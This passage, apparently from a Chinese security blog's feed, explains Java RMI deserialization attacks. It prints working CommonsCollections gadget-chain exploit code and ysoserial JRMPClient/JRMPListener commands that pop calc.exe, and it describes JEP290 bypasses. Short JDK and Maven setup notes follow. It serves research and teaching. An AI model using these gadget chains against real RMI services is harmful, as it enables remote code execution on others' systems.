class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, &quot;pwn&quot;);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = new HashMap();</span><br><span class="line">            tmpMap.put(&quot;pwn&quot;, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = null;</span><br><span class="line">            ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello1&quot;, remote);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册中心：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的结果如下，成功弹出了计算器：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/4.png" alt></p><blockquote><p>这里弹出的计算器是注册中心弹出来的。可以简单做个实验：单独运行服务端程序它会提示找不到注册中心。然后注释掉注册到注册中心的代码，直接执行代码也不会弹计算器，因为没有反序列化的触发点。</p></blockquote><p>然后我们就来总结第一种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI恶意服务端通过bind、unbind、rebind接口传输精心构造的类（传输过程是序列化数据的形式）到注册中心进行绑定，使注册中心接收到数据后进行反序列化操作从而被RCE</span><br></pre></td></tr></table></figure><p>但这种攻击具有这些条件：</p><ul><li>JDK环境：6u141、7u131、80121、JEP290规范前/8u141前。</li><li>注册中心的Java包种存在利用链。</li><li>利用bind、unbind、rebind接口。</li></ul><h4 id="JRMP客户端攻击注册中心（服务端）"><a href="#JRMP客户端攻击注册中心（服务端）" class="headerlink" title="JRMP客户端攻击注册中心（服务端）"></a>JRMP客户端攻击注册中心（服务端）</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/8.png" alt></p><blockquote><p>这种攻击方式利用到了ysoserial工具直接进行攻击注册中心，所以只要实现一个注册中心就可以攻击了。</p></blockquote><p>首先运行注册中心，然后使用下面命令执行ysoserial的payload，发起一次 JRMPClient攻击 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/5.png" alt></p><p>可以看到运行之后注册中心（就是本机）被打出了一个计算器。</p><blockquote><p>这里也是演示了如果外网存在注册中心我们如何作为一个恶意JRMP客户端去使用ysoserial攻击注册中心。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP客户端攻击服务端</strong>。</p></blockquote><p>于是总结第二种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恶意JRMP客户端通过ysoserial工具构建JRMPClient就能攻击注册中心（可能同时是服务端）使其RCE</span><br></pre></td></tr></table></figure><p>但这种攻击具有这些条件：</p><ul><li>JDK环境：6u141、7u131、80121、JEP290规范前。</li><li>注册中心的Java包种存在利用链。</li><li>利用lookup接口。</li></ul><h3 id="注册中心（JRMP服务端）攻击客户端"><a href="#注册中心（JRMP服务端）攻击客户端" class="headerlink" title="注册中心（JRMP服务端）攻击客户端"></a>注册中心（JRMP服务端）攻击客户端</h3><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/19.png" alt></p><blockquote><p>这种攻击方式利用到了ysoserial工具直接进行假装注册中心，这里是模拟受害者使用lookup（这里找到是hello但是还是会被攻击）就会被反序列化RCE。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP服务端攻击客户端</strong>。</p></blockquote><p>首先使用下面命令执行ysoserial的payload， 启动一个恶意JRMP服务端 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p>然后运行客户端的代码直接弹计算器，我惊了：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/9.png" alt></p><p>于是总结第三种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ysoserial开启一个恶意JRMP服务端，客户端lookup到这个服务端就会被RCE</span><br></pre></td></tr></table></figure><h3 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h3><ul><li>服务端攻击Registry注册中心：  通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE 。</li><li>JRMP协议客户端攻击注册中心（服务端） ： 使用JRMP协议，直接发送gadget chain的序列化数据到服务端，从而引起服务端反序列化RCE 。</li><li>JRMP协议注册中心（服务端）攻击客户端：使用JRMP协议，当客户端连上后，直接返回gadget chain的序列化数据给客户端，从而引起客户端反序列化RCE。</li></ul><blockquote><p>即是说后面两个攻击法在 <a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079#toc-3</a> 中称为JRMP客户端服务端的对打；但是在天融信文章 <a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> 中称为注册中心攻击客户端和客户端攻击注册中心。他们的示例都是一样的，所以我进行了这样的理解，比较好进行解释。</p></blockquote><h2 id="0x03-JDK的防御"><a href="#0x03-JDK的防御" class="headerlink" title="0x03 JDK的防御"></a>0x03 JDK的防御</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h3><p>在<code>JDK6u141</code>、<code>JDK7u131</code>、<code>JDK8u121</code>加入了JEP 290限制，JEP 290过滤策略有：</p><ul><li>自定义过滤器。</li><li>内置过滤器。</li></ul><h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><p> 可以使用自定义过滤器来重写特定流的进程级过滤器 。</p><h3 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h3><p>JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。例如：JDK版本换成JDK1.8.0_181，就默认使用内置过滤器。可用白名单列表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.class</span><br><span class="line">Number.class</span><br><span class="line">Remote.class</span><br><span class="line">Proxy.class</span><br><span class="line">UnicastRef.class</span><br><span class="line">RMIClientSocketFactory.class</span><br><span class="line">RMIServerSocketFactory.class</span><br><span class="line">ActivationID.class</span><br><span class="line">UID.class</span><br></pre></td></tr></table></figure><h2 id="0x04-绕过JEP290"><a href="#0x04-绕过JEP290" class="headerlink" title="0x04 绕过JEP290"></a>0x04 绕过JEP290</h2><h3 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h3><p>用<strong>UnicastRef对象新建一个RMI连接</strong>绕过JEP290的限制，下面是ysoserial的payload：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/10.png" alt></p><p>原理就是利用在白名单的UnicastRef类来发起一个RMI连接,在高版本jdk下ysoserial的JRMPListener依然可以利用。</p><h3 id="用Object绕JEP290限制"><a href="#用Object绕JEP290限制" class="headerlink" title="用Object绕JEP290限制"></a>用Object绕JEP290限制</h3><p>JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器，在<strong>RMI客户端和服务端在通信时参数传递</strong>这块是没有做处理的，而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload，传输依然会有问题。</p><p>首先定义HelloInterface接口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意sayPayload方法的返回类型就是Object – Object在Java中是各种类型的根类。</p></blockquote><p>然后实现接口HelloImpl：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现服务端（把注册中心也写在了服务端里面）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new Rmi.ObjectBypassJEP.HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException | AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;while(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现恶意客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                            new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                            new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                            new Class[]&#123;String.class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">            TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span><br><span class="line">            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);</span><br><span class="line">            Field valfield = poc.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            valfield.setAccessible(true);</span><br><span class="line">            valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">            hello.sayPayload(poc);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>同样的恶意客户端先通过getRegistry获取注册中心（服务端）并lookup绑定的hello。随后构造恶意类并调用绑定的方法，即可传恶意序列化数据使服务端RCE。</p></blockquote><p>我在JDK8u211的版本下能成功执行弹出服务端的计算器，如下所示：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/11.png" alt></p><p>然而在实际使用场景很少有参数是Object类型的，而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String)，具体有如下四种bypass的思路：</p><blockquote><p>际使用场景很少有参数是Object类型：即是说服务端很少有人会写返回类型是Object型的方法的。</p></blockquote><ul><li>将java.rmi包的代码复制到新包，并在新包中修改相应的代码</li><li>将调试器附加到正在运行的客户端，并在序列化之前替换这些对象</li><li>使用诸如Javassist这样的工具修改字节码</li><li>通过实现代理替换网络流上已经序列化的对象</li></ul><p>未完待续…</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> </li><li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a> </li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a> </li><li><a href="https://xz.aliyun.com/t/7264#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7264#toc-2</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;反序列化之RMI&quot;&gt;&lt;a href=&quot;#反序列化之RMI&quot; class=&quot;headerlink&quot; title=&quot;反序列化之RMI&quot;&gt;&lt;/a&gt;反序列化之RMI&lt;/h1&gt;&lt;p&gt;前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JDK</title>
    <link href="http://bai-ren-1.github.io/2020/07/24/JDK/"/>
    <id>http://bai-ren-1.github.io/2020/07/24/JDK/</id>
    <published>2020-07-24T12:44:10.000Z</published>
    <updated>2020-07-25T01:46:08.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h1><p>再水一水一篇无聊的文章。hhh，都是很简单的内容，因为环境在公司搭建的，很多时候回到家里就懒得复现搭建。今天突然心情大好，就记录记录这些简单的东西。</p><h2 id="0x00-JDK版本"><a href="#0x00-JDK版本" class="headerlink" title="0x00 JDK版本"></a>0x00 JDK版本</h2><p>下面只是个人的见解，不过应该没错的啦：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK8 &gt;= JDK1.8.121 = JDK8u121</span><br></pre></td></tr></table></figure><blockquote><p>当然JDK不止121这个版本，还会有261等版本；但是这些版本都是属于JDK8，而且正式写的话是叫JDK1.8。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK11 &gt;= JDK11.0.8</span><br></pre></td></tr></table></figure><blockquote><p>当然JDK现在出到11，超出了10，所以就直接版本号这样定义咯。</p></blockquote><h2 id="0x01-JDK共存"><a href="#0x01-JDK共存" class="headerlink" title="0x01 JDK共存"></a>0x01 JDK共存</h2><p>很多时候研究Java的payload的时候很吃JDK的版本，或者是一些依赖。所以吧，设置多个JDK版本来备用是个好习惯。首先建立一个要使用的系统变量JAVA_HOME，然后根据自己下载的JDK版本新建不同的带有版本信息的JAVA_HOMEX的环境变量：</p><p><img src="/2020/07/24/JDK/1.png" alt></p><blockquote><p>要使用JDKX的话就将JAVA_HOME的值改为%JAVA_HOMEX%，这里我是用JDK8</p></blockquote><p><img src="/2020/07/24/JDK/2.png" alt></p><p>然后再系统变量Path添加前两项（bin和jre\bin）后就可以啦。最后新建一个classpath就可以了：</p><p><img src="/2020/07/24/JDK/8.png" alt></p><p>以后你要切换哪个就修改环境变量JAVA_HOME的值就可以了。</p><h2 id="0x02-IDEA切换版本"><a href="#0x02-IDEA切换版本" class="headerlink" title="0x02 IDEA切换版本"></a>0x02 IDEA切换版本</h2><p>有时打开IDEA打到兴头上，根本不想切换JDK。其实IDEA里面可以直接选择使用的JDK：</p><p><img src="/2020/07/24/JDK/3.png" alt></p><p>点击右上角的项目结构的按钮，然后按下面添加其他JDK的路径：</p><p><img src="/2020/07/24/JDK/4.png" alt></p><p>当然这个是我自己在公司试的，当时是有用的。也不知道是不是正解，无效请自行上网搜索。</p><p><img src="/2020/07/24/JDK/5.png" alt></p><p>上面切换后编译提示找不到JDK的classpath的话就把这个选项去了：</p><p><img src="/2020/07/24/JDK/9.png" alt></p><h2 id="0x03-Maven"><a href="#0x03-Maven" class="headerlink" title="0x03 Maven"></a>0x03 Maven</h2><p>IDEA中配置Maven之前就做好啦，当时没想记录这些简单的东西，将就一下吧。</p><p><img src="/2020/07/24/JDK/6.png" alt></p><p>要使用Maven的话就偷偷藏在那里，点开就有许多命令可以使用了。噢噢然后写Sonar的时候得跳过它的检测进行打包Jar，如果使用Maven进行打包Jar的话，得选择跳过检测的选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure><p><img src="/2020/07/24/JDK/7.png" alt></p><p>执行完就可以再target文件夹里拿到你的Jar包啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JDK&quot;&gt;&lt;a href=&quot;#JDK&quot; class=&quot;headerlink&quot; title=&quot;JDK&quot;&gt;&lt;/a&gt;JDK&lt;/h1&gt;&lt;p&gt;再水一水一篇无聊的文章。hhh，都是很简单的内容，因为环境在公司搭建的，很多时候回到家里就懒得复现搭建。今天突然心情大好，就记录记录
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections3利用链</title>
    <link href="http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2020-07-19T10:18:39.000Z</published>
    <updated>2020-07-19T14:49:14.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链"><a href="#CommonsCollections3利用链" class="headerlink" title="CommonsCollections3利用链"></a>CommonsCollections3利用链</h1><p>2015年最大的漏洞莫过于CommonsCollections反序列化漏洞了。它借用了Java反序列化和Apache Commons Collections这一基础类库，从而实现远程命令执行。然后下面记录的就是Commons Collections3的版本的方法进行构造调用链的过程和分析。</p><h2 id="0x00-CommonsCollections调用链执行"><a href="#0x00-CommonsCollections调用链执行" class="headerlink" title="0x00 CommonsCollections调用链执行"></a>0x00 CommonsCollections调用链执行</h2><p>首先在<a href="https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：</a></p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/1.png" alt></p><p>然后我们上面红圈的地方，右键导入后选择”Add as Library”。然后在弹出的窗口中选择OK就可以啦。这一步的目的是将CommonsCollections3中使用的依赖方法进行引入。</p><blockquote><p>所以要使用这个方法攻击服务器需要服务器上存在CommonsCollections3的环境。</p></blockquote><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/2.png" alt></p><p>首先贴上调用链执行的代码和效果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 